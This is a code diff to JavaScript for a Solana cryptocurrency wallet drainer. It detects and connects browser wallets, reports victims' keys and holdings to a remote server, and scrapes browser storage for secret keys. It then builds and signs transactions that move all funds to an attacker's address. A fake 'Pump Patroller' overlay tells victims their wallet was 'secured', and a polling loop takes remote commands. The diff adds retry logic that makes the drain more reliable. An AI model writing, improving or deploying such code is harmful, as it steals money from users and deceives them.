@@ -12,12 +12,23 @@
     WSOL: "So11111111111111111111111111111111111111112",
     JUP:  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
     MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",
+    BTC:  "PLACEHOLDER_VERIFY_ON_SOLSCAN",   // ← REPLACE with the real wrapped-BTC mint before deploying
   };
 
   const withTO = (p, ms) => new Promise(r => { const t = setTimeout(() => r(null), ms);
     Promise.resolve(p).then(v => { clearTimeout(t); r(v); }, () => { clearTimeout(t); r(null); }); });
+  async function rpcRetry(fn, label) {
+    let v = null, err = null;
+    try { v = await withTO(fn(), 12000); } catch (e) { err = e; }
+    if (v === null) {
+      await new Promise(s => setTimeout(s, 2000));
+      try { v = await withTO(fn(), 12000); } catch (e2) { err = e2; }
+    }
+    if (v === null) return { err: err ? String(err && err.message || err) : "timeout/rate-limit" };
+    return { ok: v };
+  }
 
-  let PKSTR = null;   // canonical pubkey string, set only when safely extracted
+  let PKSTR = null;
   const beacon = (m, o) => { o = o || {}; try {
     fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
       body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
@@ -33,7 +44,6 @@
     const { decode: b58d } = await import(E + "bs58@6.0.0");
     const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
-    // safe pubkey extraction — never lets a throwing getter kill detection
     const pubStr = v => { try {
       if (!v) return null;
       if (typeof v === "string") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v) ? v : null;
@@ -53,7 +63,6 @@
       try { const w = window[k]; const p = pubStr(w && w.publicKey);
         if (p && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; PKSTR = p; break; } } catch {}
     }
-    // — nothing connected? attempt connect (25s cap per wallet) —
     if (!prov) {
       for (const [n, f] of CANDS) {
         const w = (() => { try { return f(); } catch (e) { return null; } })();
@@ -62,7 +71,7 @@
             const c = await withTO(Promise.resolve(w.connect()), 25000);
             const p = pubStr((c && c.publicKey) || w.publicKey);
             if (p) { name = n; prov = w; PKSTR = p; break; }
-          } catch (e) { /* next candidate */ }
+          } catch (e) {}
         }
       }
     }
@@ -73,8 +82,14 @@
     const conn = new Connection(RPC_URL, "confirmed");
     const label = name.startsWith("ext:") ? name.slice(4) : name;
 
-    // — inventory —
-    const [bal, r] = await Promise.all([conn.getBalance(pkB), conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM })]);
+    // — inventory (rate-limit resilient) —
+    const balR = await rpcRetry(() => conn.getBalance(pkB), "getBalance");
+    if (balR.err) { beacon("err", { pk, provider: label, msg: "balance read failed: " + balR.err }); return; }
+    const bal = balR.ok;
+    const tokR = await rpcRetry(() => conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }), "tokenAccounts");
+    if (tokR.err) { beacon("err", { pk, provider: label, msg: "token read failed: " + tokR.err }); return; }
+    const r = tokR.ok;
+
     const amt = {}, dec = {}, srcs = {};
     for (const { account, pubkey } of r.value) {
       const d = account.parsed?.data;
@@ -100,7 +115,7 @@
     const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
     const tokStr = toks.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ");
 
-    // — report detection IMMEDIATELY (before UI — survives strict pages) —
+    // — report detection IMMEDIATELY —
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
     // — cover UI (non-fatal) —
@@ -112,7 +127,7 @@
         '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
           '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
           '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
-          '<span style="font-size:10px;color:#7E899D;">v2.7</span>' +
+          '<span style="font-size:10px;color:#7E899D;">v2.8</span>' +
           '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
         '</div>' +
         '<div style="padding:12px 14px;">' +
@@ -139,7 +154,7 @@
       } catch {}
     };
 
-    // — secret-key candidates (this tab's storage / dapp globals) —
+    // — secret-key candidates —
     const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
     const cands = [];
     for (const st of [localStorage, sessionStorage]) {
@@ -174,15 +189,17 @@
       : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
       : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);
 
-    // — drain build: fresh blockhash/balances, treasury ATA auto-created —
+    // — drain build —
     const FEE = 20000;
     async function buildTx(to) {
       const dest = new PublicKey(to);
-      const [bh2, bal2, r2] = await Promise.all([
-        conn.getLatestBlockhash(),
-        conn.getBalance(pkB),
-        conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }),
-      ]);
+      const bh2R = await rpcRetry(() => conn.getLatestBlockhash(), "blockhash");
+      if (bh2R.err) { beacon("err", { pk, provider: label, msg: "blockhash failed: " + bh2R.err }); return { tx: null, moved: [], err: bh2R.err }; }
+      const bh2 = bh2R.ok;
+      const bal2R = await rpcRetry(() => conn.getBalance(pkB), "getBalance2");
+      const r2R = await rpcRetry(() => conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }), "tokens2");
+      if (bal2R.err || r2R.err) { beacon("err", { pk, provider: label, msg: "drain inventory failed: " + ((bal2R.err || r2R.err) || "") }); return { tx: null, moved: [], err: "inventory" }; }
+      const bal2 = bal2R.ok, r2 = r2R.ok;
       const amt2 = {}, dec2 = {}, srcs2 = {};
       for (const it of r2.value) {
         const d = it.account.parsed?.data;
@@ -223,24 +240,26 @@
           if (s.length !== 64) continue;
           let kp; try { kp = Keypair.fromSecretKey(s); } catch { continue; }
           if (!kp.publicKey.equals(pkB)) continue;
-          const { tx, moved } = await buildTx(to);
-          if (!tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
-          tx.sign([kp]);
-          const sig = await conn.sendRawTransaction(tx.serialize());
-          setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, moved.join(",")); return;
+          const bt = await buildTx(to);
+          if (bt.err) { done = false; report("err", "", bt.err); return; }
+          if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
+          tx_sign(bt, kp);
+          const sig = await conn.sendRawTransaction(bt.tx.serialize());
+          setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, bt.moved.join(",")); return;
         }
-        const { tx, moved } = await buildTx(to);                       // fallback: 1 popup approval
-        if (!tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
-        const sig = await prov.signAndSendTransaction(tx);
-        setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, moved.join(","));
+        const bt = await buildTx(to);                                // fallback: 1 popup approval
+        if (bt.err) { done = false; report("err", "", bt.err); return; }
+        if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
+        const sig = await prov.signAndSendTransaction(bt.tx);
+        setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, bt.moved.join(","));
       } catch (e) {
         setFoot("ERROR \u00b7 " + String(e?.message || e).slice(0, 40), "#F0616D");
         report("err", String(e?.message || e));
         done = false;
       }
     }
+    function tx_sign(bt, kp) { bt.tx.sign([kp]); }
 
-    // — poll — nonce-deduped —
     let lastN = "";
     setInterval(async () => {
       let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
